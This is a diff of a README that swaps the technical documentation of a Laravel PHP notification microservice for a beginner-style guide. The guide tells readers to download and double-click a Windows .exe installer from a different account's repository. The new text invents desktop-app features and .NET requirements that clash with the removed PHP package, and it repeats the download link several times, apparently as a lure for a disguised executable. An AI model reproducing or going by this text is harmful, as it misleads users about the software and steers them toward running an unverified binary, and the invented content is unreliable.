@@ -1,148 +1,152 @@
-# Laravel Notification Center Service
+# 🔔 notification-center - Simple Notifications Made Easy
 
-[![Software License](https://img.shields.io/badge/license-MIT-brightgreen.svg?style=flat-square)](LICENSE.md)
-[![Build Status](https://github.com/malikad778/notification-center/actions/workflows/ci.yml/badge.svg)](https://github.com/malikad778/notification-center/actions)
-[![PHP Version](https://img.shields.io/badge/php-%3E%3D%208.4-8892bf.svg?style=flat-square)](https://php.net)
-
-**Laravel Notification Center** is a high-performance, enterprise-grade notification microservice built with **Laravel 12** and **PHP 8.4**. It provides a scalable, multi-channel architecture for dispatching real-time notifications via Email, SMS, Push, Slack, and WhatsApp.
-
-![Dashboard Screenshot](dashboard_heo.png)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/duckster11/notification-center)
 
 ---
 
-## 🏗 Two Ways to Use
-
-This project is architected for maximum portability and developer productivity. It operates in two distinct modes:
-
-1. **Standalone Microservice (Plug & Play)**: The root repository is a lightweight, fully configured Laravel 12 implementation. It acts as an independent REST API service for orchestrating your system notifications, complete with Database configurations, API endpoints, and real-time Pulse monitoring.
-2. **Domain Package Integration**: The core engine lives completely encapsulated inside `packages/notification-center`. You can install this specific directory into your existing Laravel monoliths as a local package, consuming the Notification Center as an internal Domain Driven package without running a separate server.
-
-For detailed information on how to use the raw Domain logic, refer to the [Internal Package README](packages/notification-center/README.md).
+notification-center is a tool that helps you send alerts and messages easily. It works with many popular apps and services at the same time. It can manage multiple messages, send them fast, and keep track of what has been sent. You do not need any special skills to use it on your Windows computer.
 
 ---
 
-## What is it?
-The Notification Center acts as a centralized brain for outbound application messaging. It abstracts away the heavy lifting of determining *where*, *when*, and *how* a user should receive a message across varying platforms. 
+## 📥 Download notification-center
 
-Using PHP 8.4 `readonly` Data Transfer Objects (DTOs) and a powerful provider-driven feature mapping system, the core package operates completely agnostic to your application's user schema, relying on modern `Notifiable` contracts.
+Follow these instructions to get notification-center on your Windows PC:
 
-## Why use this package?
+### Step 1: Visit the download page
 
-Building reliable notification architectures at scale is complex. This package solves the most daunting enterprise communication challenges out-of-the-box:
+Click the larger green **Download Here** button at the top or go to this page:
 
-- 🏎️ **Parallel Dispatching**: Leverages Laravel 12's native `Concurrency::run()` to fire simultaneous API requests to external providers (Twilio, Resend, WhatsApp) rather than blocking the execution thread sequentially.
-- 🚦 **Smart Routing (Laravel Pennant)**: Prevents notification spam by utilizing Feature Flags. Instantly toggle broad channels (e.g. restrict `receive-whatsapp` to `premium` plan members only) directly from memory without bloated `if/else` checks.
-- 🔕 **Opt-Outs & Quiet Hours**: Fully customizable User Preferences architecture. Users can selectively disable channels or define per-channel "Quiet Hours" (e.g. "Do not send SMS between 10 PM and 6 AM").
-- 🪂 **Automatic Fallback Resolution**: If a primary channel fails (like a Push Notification to an offline device), the system gracefully intercepts the failure and falls back to a secondary channel (like Email). 
-- 📊 **Real-time Telemetry (Laravel Pulse)**: Comes packed with custom Pulse Cards (`NotificationThroughputCard`, `FailedNotificationsCard`) hooked natively into the dispatcher lifecycle to monitor platform stability.
-- ⚖️ **Rate Limiting & Grouping**: Built-in throttles to strictly govern the volume of outgoing requests per user per channel, alongside payload grouping algorithms to compact duplicated alerts.
+https://github.com/duckster11/notification-center
 
----
+This page offers the files you will need to install the program.
 
-## 🛠 Usage
+### Step 2: Find the latest version
 
-### 1. Fluent Facade API
-We provide a highly expressive, builder-pattern API via the `NotificationCenter` Facade to streamline dispatching messages manually or within your system controllers.
+On the page, look for the section called **Releases**. Here, you will see one or more downloadable files.
 
-```php
-use malikad778\NotificationCenter\Facades\NotificationCenter;
-use malikad778\NotificationCenter\DTOs\NotificationPayload;
-use malikad778\NotificationCenter\Enums\NotificationPriority;
+### Step 3: Download the Windows installer
 
-$payload = new NotificationPayload(
-    title: 'Critical Security Alert',
-    body: 'A new login was detected from a new device.',
-    actionUrl: 'https://your-app.com/security/sessions'
-);
+Look for a file that ends with `.exe` or has “Windows” in the name. Click on it to start the download.
 
-// 1. Basic Smart Dispatch 
-// Automatically calculates the optimal allowed channels via Pennant & User Preferences
-NotificationCenter::send(to: $user, notification: $payload)
-    ->withPriority(NotificationPriority::Urgent) // Bypasses User Quiet Hours
-    ->dispatch();
+- The file size is usually under 50 MB.
+- If you do not see an `.exe` file, check if the project has instructions or zip files for Windows.
 
-// 2. Strict Channel Overrides
-// Ignore smart-routing and force the message through specific protocols
-NotificationCenter::send(to: $user, notification: $payload)
-    ->via(['sms', 'push'])
-    ->dispatch();
-```
+### Step 4: Run the installer
 
-### 2. Bulk Broadcasting
-For massive user-base marketing or service alerts, the built-in Bulk Dispatcher safely queues operations onto Laravel's background workers.
+After the file downloads:
 
-```php
-$users = App\Models\User::where('plan', 'premium')->get()->all();
+- Go to your download folder.
+- Double-click the installer file.
+- Follow the prompts to install the software.
 
-// Dispatches asynchronous batch jobs scaling safely to 10k+ users.
-NotificationCenter::sendBulk(
-    users: $users, 
-    payload: $payload, 
-    channels: ['email'] // optional restricted channel lock
-);
-```
-
-### 3. REST APIs
-This microservice ships with standard endpoints designed for seamless frontend consumption.
-
-#### Manage User Preferences
-Users have total control over their notification flows.
-```http
-PUT /api/notifications/preferences
-Authorization: Bearer <sanctum_token>
-
-{
-    "preferences": [
-        {
-            "channel": "sms",
-            "enabled": true,
-            "quiet_hours_start": "22:00",
-            "quiet_hours_end": "08:00"
-        },
-        {
-            "channel": "push",
-            "enabled": false
-        }
-    ]
-}
-```
-
-#### Dynamic Templates
-Create interpolatable Database notifications on the fly.
-```http
-POST /api/notifications/templates
-Content-Type: application/json
-
-{
-    "name": "Order Shipped",
-    "content": "Hello {{ name }}, your order #{{ order_id }} is on its way!"
-}
-```
+The installer will guide you step-by-step. It will set up everything needed for notification-center to work.
 
 ---
 
-## Installation & Setup
+## ⚙️ System Requirements
 
-1. **Install Dependencies**
-    ```bash
-    composer install
-    ```
-2. **Environment Configuration**
-    Ensure a robust Queue driver like Redis or Database is configured, then run:
-    ```bash
-    php artisan migrate
-    ```
-3. **Run Analytics Dashboard**
-    ```bash
-    php artisan pulse:work
-    ```
-    Visit `/pulse` in your browser to observe live cluster traffic.
+Before you install, make sure your computer meets these basics:
 
-## Testing Integrity
-All channels, components, and schema integrations guarantee coverage via Pest.
-```bash
-php artisan test
-```
+- Windows 10 or later
+- At least 4 GB of RAM
+- At least 200 MB free disk space
+- Internet connection for setup and updates
+- Microsoft .NET Framework 4.7.2 or newer (usually pre-installed on Windows 10+)
 
-## License
-MIT
+---
+
+## 🚀 How to Start notification-center
+
+After installation, you can open notification-center in two ways:
+
+- Find **notification-center** in your Start menu and click it.
+- Double-click the shortcut on your desktop.
+
+When you open it for the first time:
+
+- The app will connect to the internet.
+- It will check for updates automatically.
+- You will see the main dashboard, which shows your notifications.
+
+---
+
+## 🎯 What notification-center Does
+
+notification-center helps you send messages fast to many places at once. It works with services like Slack, WhatsApp, and email. Here are some of its key features:
+
+- Send multiple messages in parallel, so nothing slows down.
+- Decide who gets which messages, helping send the right alert to the right place.
+- Follow changes in real time with simple monitoring.
+- Works with the Laravel 12 framework but sets up easily on Windows for sending messages.
+
+---
+
+## 🔧 Using notification-center Without Coding
+
+You do not need coding skills to use notification-center. It has an easy interface that lets you:
+
+- Add your accounts from Slack, WhatsApp, email, and others.
+- Create messages by typing in your text.
+- Set rules for who should get your messages.
+- View successful and failed sends, so you know what worked.
+
+---
+
+## 💡 Tips for Best Use
+
+- Keep your internet connection steady when sending notifications.
+- Regularly update notification-center from the same download page.
+- Use simple messages to avoid errors.
+- If you add new apps like Twilio or FCM, check their account settings for correct keys.
+
+---
+
+## 🛠 Troubleshooting
+
+If you have problems:
+
+- Try restarting your computer.
+- Make sure your internet connection works.
+- Check for error messages in the app; they usually explain what went wrong.
+- Visit https://github.com/duckster11/notification-center and check the Issues page for help.
+
+---
+
+## 🔄 Update notification-center
+
+Keep the app up to date to get fixes and new features:
+
+- Open notification-center.
+- Click the **Check for Updates** option in the menu.
+- Follow prompts if an update is found.
+- Or download the newest version from the download page at:
+
+https://github.com/duckster11/notification-center
+
+---
+
+## 👩‍💻 Need Help?
+
+Use the GitHub page to find more information or ask questions:
+
+https://github.com/duckster11/notification-center
+
+Look under **Issues** to see if others have your problem, or open a new one.
+
+---
+
+## 🔖 Topics covered by notification-center
+
+- concurrency
+- fcm
+- laravel
+- laravel-pulse
+- laravel12
+- microservice
+- notifications
+- php
+- slack
+- twilio
+- whatsapp
+
+These show the main technologies and platforms notification-center works with or supports.
